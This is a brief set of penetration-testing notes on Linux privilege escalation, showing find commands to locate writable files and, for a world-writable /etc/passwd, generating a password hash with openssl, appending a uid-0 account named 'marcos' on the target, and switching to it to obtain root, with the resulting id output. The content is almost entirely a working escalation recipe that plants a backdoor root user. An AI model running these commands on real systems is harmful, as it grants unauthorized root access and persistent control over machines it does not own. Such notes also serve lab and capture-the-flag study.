wp```bash
find / -type f -writable 2>/dev/null
find /etc /var /opt -type f -writable 2>/dev/null
find / -type f -writable -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null
```
## /etc/passwd

```bash
-rw-rw-rw- 1 root root 1465 ago 29 04:36 /etc/passwd
# execute in local 
openssl passwd -1 my_password
$1$0y3ITQ97$41GpqQreMoe7FNd8FhGRn1
# execute in target
echo "marcos:\$1\$0y3ITQ97\$41GpqQreMoe7FNd8FhGRn1:0:0:root:/root:/bin/bash" >> /etc/passwd

su marcos
Contrasena: my_password

id
uid=0(root) gid=0(root) grupos=0(root)
```
